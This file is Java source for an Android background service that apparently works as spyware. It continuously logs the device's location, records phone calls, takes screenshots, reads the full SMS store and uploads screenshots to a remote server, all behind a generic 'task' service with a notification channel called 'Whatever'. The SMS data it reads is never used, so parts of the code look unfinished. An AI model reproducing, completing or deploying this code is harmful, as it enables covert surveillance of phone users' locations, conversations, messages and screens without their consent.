package com.range.task;

import android.annotation.SuppressLint;
import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.MediaScannerConnection;
import android.media.ToneGenerator;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.room.Room;

import com.aykuttasil.callrecord.CallRecord;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class TaskService extends Service {

    private static final String CHANNEL_WHATEVER = "channel_whatever";
    private static final int NOTIFY_ID = 9906;
    static final String EXTRA_RESULT_CODE = "resultCode";
    static final String EXTRA_RESULT_INTENT = "resultIntent";
    static final String ACTION_RECORD =
            BuildConfig.APPLICATION_ID + ".RECORD";
    static final String ACTION_SHUTDOWN =
            BuildConfig.APPLICATION_ID + ".SHUTDOWN";
    static final int VIRT_DISPLAY_FLAGS =
            DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY |
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    private MediaProjection projection;
    private VirtualDisplay vdisplay;
    final private HandlerThread handlerThread =
            new HandlerThread(getClass().getSimpleName(),
                    android.os.Process.THREAD_PRIORITY_BACKGROUND);
    private Handler handler;
    private MediaProjectionManager mgr;
    private WindowManager wmgr;
    private ImageTransmogrifier it;
    private int resultCode;
    private Intent resultData;
    final private ToneGenerator beeper =
            new ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100);

    @SuppressLint("SimpleDateFormat")
    private SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yy-hh:mm:ss");

    private TaskDao taskDao;

    @Override
    public void onCreate() {
        super.onCreate();

        taskDao = Room.databaseBuilder(this, TaskDatabase.class, "task.db")
                .build().taskDao();

        mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        wmgr = (WindowManager) getSystemService(WINDOW_SERVICE);

        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());
        bindLocation();
        bindCallRecorder();
    }

    @SuppressLint("MissingPermission")
    private void bindLocation() {
        LocationListener locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location location) {
                final LocationModel model = new LocationModel();
                model.setTime(sdf.format(new Date()));
                model.setLat(location.getLatitude());
                model.setLon(location.getLongitude());
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        taskDao.insertLocation(model);
                    }
                }).start();

            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(@NonNull String provider) {

            }

            @Override
            public void onProviderDisabled(@NonNull String provider) {

            }
        };
        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
    }

    private void bindCallRecorder(){
        CallRecord callRecord = new CallRecord.Builder(this)
                .setRecordFileName("rec")
                .setRecordDirName("callRecord")
                .setRecordDirPath(Objects.requireNonNull(getExternalFilesDir(null)).getAbsolutePath())
                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .build();
        callRecord.startCallRecordService();
    }


    @Override
    public int onStartCommand(Intent i, int flags, int startId) {
        if (i.getAction() == null) {
            resultCode = i.getIntExtra(EXTRA_RESULT_CODE, 1337);
            resultData = i.getParcelableExtra(EXTRA_RESULT_INTENT);
            foregrounding();
        } else if (ACTION_RECORD.equals(i.getAction())) {
            if (resultData != null) {
                startCapture();
            } else {
                Intent ui =
                        new Intent(this, MainActivity.class)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                startActivity(ui);
            }
        } else if (ACTION_SHUTDOWN.equals(i.getAction())) {
            beeper.startTone(ToneGenerator.TONE_PROP_NACK);
            stopForeground(true);
            stopSelf();
        }

        return (START_NOT_STICKY);
    }


    @Override
    public void onDestroy() {
        stopCapture();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        throw new IllegalStateException("Binding not supported. Go away.");
    }

    WindowManager getWindowManager() {
        return (wmgr);
    }

    Handler getHandler() {
        return (handler);
    }

    void processImage(final byte[] png) {
        new Thread() {
            @SuppressLint("SimpleDateFormat")
            @Override
            public void run() {
                File output = new File(getExternalFilesDir("screens"), sdf.format(new Date()) + "-screenshot.png");

                try {
                    FileOutputStream fos = new FileOutputStream(output);

                    fos.write(png);
                    fos.flush();
                    fos.getFD().sync();
                    fos.close();

                    MediaScannerConnection.scanFile(TaskService.this,
                            new String[]{output.getAbsolutePath()},
                            new String[]{"image/png"},
                            null);
                } catch (Exception e) {
                    Log.e("BAG", "Exception writing out screenshot", e);
                }
            }
        }.start();

        beeper.startTone(ToneGenerator.TONE_PROP_ACK);
        stopCapture();
    }

    private void stopCapture() {
        if (projection != null) {
            projection.stop();
            vdisplay.release();
            projection = null;
        }
    }


    private void startCapture() {
        projection = mgr.getMediaProjection(resultCode, resultData);
        it = new ImageTransmogrifier(this);

        MediaProjection.Callback cb = new MediaProjection.Callback() {
            @Override
            public void onStop() {
                vdisplay.release();
            }
        };

        vdisplay = projection.createVirtualDisplay("andshooter",
                it.getWidth(), it.getHeight(),
                getResources().getDisplayMetrics().densityDpi,
                VIRT_DISPLAY_FLAGS, it.getSurface(), null, handler);
        projection.registerCallback(cb, handler);

        // Sms reader
        StringBuilder msgData = new StringBuilder();
        @SuppressLint("Recycle") Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
        assert cursor != null;
        if (cursor.moveToFirst()) {
            do {
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    msgData.append(" ").append(cursor.getColumnName(idx)).append(":").append(cursor.getString(idx));
                }
            } while (cursor.moveToNext());
        }

        uploadFiles();

    }

    private void foregrounding() {
        NotificationManager mgr =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                mgr.getNotificationChannel(CHANNEL_WHATEVER) == null) {
            mgr.createNotificationChannel(new NotificationChannel(CHANNEL_WHATEVER,
                    "Whatever", NotificationManager.IMPORTANCE_DEFAULT));
        }

        NotificationCompat.Builder b =
                new NotificationCompat.Builder(this, CHANNEL_WHATEVER);

        b.setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL);

        b.setContentTitle(getString(R.string.app_name))
                .setSmallIcon(R.mipmap.ic_launcher)
                .setTicker(getString(R.string.app_name));

        b.addAction(R.drawable.ic_record,
                getString(R.string.notify_record),
                buildPendingIntent(ACTION_RECORD));

        b.addAction(R.drawable.ic_eject,
                getString(R.string.notify_shutdown),
                buildPendingIntent(ACTION_SHUTDOWN));

        startForeground(NOTIFY_ID, b.build());
    }

    private PendingIntent buildPendingIntent(String action) {
        Intent i = new Intent(this, getClass());

        i.setAction(action);

        return (PendingIntent.getService(this, 0, i, 0));
    }


    private void uploadFiles(){
        File origFile = null;
        File[] fileList = getExternalFilesDir("screens").getAbsoluteFile().listFiles();
        assert fileList != null;
        for (File file : fileList){
            if (file.getName().endsWith(".png")){
                origFile = file;
            }
        }

        Map<String, File> params = new HashMap<>();
        params.put("screenshot", origFile);

        ApiClient.getRetrofitInterface().uploadFile(params).enqueue(new Callback<ParseResponse>() {
            @Override
            public void onResponse(Call<ParseResponse> call, Response<ParseResponse> response) {
                if (response.isSuccessful()){
                }
            }

            @Override
            public void onFailure(Call<ParseResponse> call, Throwable t) {
                Log.d("BAG", t.getMessage());
            }
        });

    }

}
